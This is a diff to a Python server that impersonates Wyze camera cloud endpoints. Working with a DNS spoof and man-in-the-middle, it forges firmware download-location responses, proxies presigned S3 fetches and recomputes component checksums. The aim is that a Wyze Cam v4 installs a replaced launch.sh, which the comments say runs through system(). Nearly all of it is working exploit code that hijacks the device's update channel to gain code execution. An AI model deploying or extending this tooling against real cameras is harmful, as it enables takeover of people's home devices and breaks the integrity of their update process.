@@ -254,6 +254,44 @@ def main() -> int:
             super().__init__(*x, directory=a.dir, **kw)
 
         def do_GET(self):
+            # S3 component proxy: the camera fetches presigned URLs (valid signatures) that our
+            # DNS spoof routes here. For any path we do not have locally, forward the request
+            # VERBATIM — same path + same presigned query — to the real S3 host the URL was
+            # signed for, and stream the response back. This makes the full component set
+            # (12 files + launch.sh) fetchable through us without mirroring every byte.
+            if self.path.startswith(("/wyzeedgeai_cam_v4_test_protocol/", "/kvsWebrtcClientMaster_t41/")) \
+                    and not os.path.exists(os.path.join(a.dir, self.path.split("?")[0].lstrip("/"))):
+                try:
+                    import urllib.parse
+                    host = "sinker-t-usw2.s3.us-west-2.amazonaws.com"
+                    fwd = self.path if "?" in self.path else self.path + \
+                        "?" + ("X-Amz-Signature=proxy" if "X-Amz" not in self.path else "")
+                    req = (f"GET {fwd} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
+                    raw = socket.create_connection((host, 443), timeout=15)
+                    ctx = ssl.create_default_context()
+                    c = ctx.wrap_socket(raw, server_hostname=host)
+                    c.sendall(req)
+                    buf = b""
+                    while True:
+                        d = c.recv(65536)
+                        if not d:
+                            break
+                        buf += d
+                    c.close()
+                    head, _, body = buf.partition(b"\r\n\r\n")
+                    status = int(head.split(b" ")[1]) if b" " in head else 502
+                    print(f"{self.address_string()} ua={self.headers.get('User-Agent','-')!r} "
+                          f"GET {self.path.split('?')[0]} -> S3 proxy {status} ({len(body)}B)", flush=True)
+                    self.send_response(status)
+                    for line in head.split(b"\r\n"):
+                        if line.lower().startswith((b"content-type:", b"etag:")):
+                            self.send_header(line.split(b":")[0].decode(), line.split(b":", 1)[1].decode().strip())
+                    self.send_header("Content-Length", str(len(body)))
+                    self.end_headers()
+                    self.wfile.write(body)
+                    return
+                except Exception as exc:
+                    print(f"  -> S3 proxy failed: {exc}", flush=True)
             # The SDK builds the get_firmware_detail request itself; accept GET too so a
             # probe or an SDK variant that uses GET still lands on the trigger (§23.4).
             if "get_firmware_detail" in self.path and a.firmware_detail:
@@ -401,8 +439,8 @@ def main() -> int:
                 base = "https://s3-us-west-2.amazonaws.com"
                 # advertised version is bumped so the device sees a change; the served paths stay on
                 # the version we mirrored, because the bytes are the real 50039 ones.
-                model_ver = os.environ.get("MODEL_VER", "14.9.50040.r")
-                model_path_ver = "14.9.50039.r"
+                model_ver = os.environ.get("MODEL_VER", "14.9.50041.r")
+                model_path_ver = "14.9.50041.r"
                 # the kvs process keeps its REAL version: 2.1.2.573 does not exist on the cloud, so
                 # bumping it only produces NoSuchKey for webrtc.tar.gz.
                 kvs_ver = os.environ.get("KVS_VER", "2.1.2.571")
@@ -429,32 +467,53 @@ def main() -> int:
                     req = {}
                 name = req.get("processname") or ""
                 if "get_download_location" in self.path:
-                    # ALWAYS hand out the real presigned URL (passthrough via the MITM):
-                    # a forged signature (0*64) can be rejected client-side before any fetch,
-                    # while the real URL validates — and the DNS spoof routes the resulting
-                    # fetch to this same forge, which serves the path with our SNI cert.
+                    # Prefer the real presigned URL (passthrough via the MITM): a forged
+                    # signature (0*64) can be rejected client-side before any fetch.
+                    # FALLBACK: if the cloud doesn't know the requested version (e.g. our
+                    # advertised bump ahead of the cloud's catalog), passthrough returns an
+                    # error shape — then serve our own dl-loc pointing at the DNS-spoofed
+                    # path we serve locally; the camera verifies bytes via OUR md5 from
+                    # get_processes, so the signature is irrelevant on this path.
                     out = passthrough(self.path, body, self.headers)
+                    try:
+                        ok = json.loads(out).get("msg") == "SUCCESS" or \
+                             json.loads(out).get("code") == "1"
+                    except Exception:
+                        ok = False
+                    if not ok:
+                        asked_ver = req.get("version") or model_ver
+                        fname = req.get("filename") or "launch.sh"
+                        path = f"/wyzeedgeai_cam_v4_test_protocol/{asked_ver}/{fname}"
+                        out = json.dumps({
+                            "code": "1", "ts": int(time.time() * 1000), "msg": "SUCCESS",
+                            "data": {"version": asked_ver,
+                                     "url": "https://sinker-t-usw2.s3.us-west-2.amazonaws.com" + path,
+                                     "filename": fname},
+                            "traceId": os.urandom(16).hex()}).encode()
+                        print(f"  -> dl-loc FALLBACK (cloud lacks {asked_ver}) serving local path", flush=True)
                     print(f"  -> dl-loc {name!r} -> {out[:220]!r}", flush=True)
                 else:
                     # The real answer lists every component with the checksum the device verifies;
                     # a short list never completes an install. Checksums are the cloud's own.
-                    COMP = [
-                        ("wyzeedgeai_cam_v4_test_protocol", "673cd0393426d370798b57affecca17a"),
-                        ("aiparams.ini", "06f0d93ba5a0d8b6be9ac5fcdd91ec3b"),
-                        ("model_params.ini", "0c4ad6d6dea852ccba25ad8cc0d159c8"),
-                        ("libaip.so", "aaaeab3235092ff23fee9534969983de"),
-                        ("libdrivers.so", "bc008dc48b165261f78cb660c1354c21"),
-                        ("libvenus.so", "83614e5b5ffcc8d414f67cc876f77788"),
-                        ("libwyzeAiTxx.so.1.0.1", "531e4fd3066d07ad4d18d0d4013539b5"),
-                        ("wave_weights.txt", "37b2ad5643de574e7d6254adc7477437"),
-                        ("sound_model_params.ini", "a93ca2e1c547bde83d41bc6714f306f7"),
-                        ("libwyze_sound_mips.so", "570875b567638dfc5b60b31206433d51"),
-                        ("res_monitor.sh", "a4fa1325f392742a11313da13426db36"),
-                        ("mem_data_upload", "0370e40df04334401fd4ae7045b131ed"),
-                        ("VERSION", "ddc95b0d133d926ea4ce9f014a75d250"),
-                        # our replacement, so the checksum is of the bytes we serve, not the cloud's
-                        ("launch.sh", md5_of("/wyzeedgeai_cam_v4_test_protocol/14.9.50039.r/launch.sh")),
-                    ]
+                    # every checksum is computed from the bytes WE serve at model_path_ver —
+                    # the device verifies served bytes against these, so they must always match
+                    COMP = [(name, md5_of(f"/wyzeedgeai_cam_v4_test_protocol/{model_path_ver}/{name}"))
+                            for name in (
+                        "wyzeedgeai_cam_v4_test_protocol",
+                        "aiparams.ini",
+                        "model_params.ini",
+                        "libaip.so",
+                        "libdrivers.so",
+                        "libvenus.so",
+                        "libwyzeAiTxx.so.1.0.1",
+                        "wave_weights.txt",
+                        "sound_model_params.ini",
+                        "libwyze_sound_mips.so",
+                        "res_monitor.sh",
+                        "mem_data_upload",
+                        "VERSION",
+                        "launch.sh",
+                    )]
                     procs = [
                         {"processname": "wyzeedgeai_cam_v4_test_protocol",
                          # the entrypoint is ours and goes straight to system(): make it self-contained
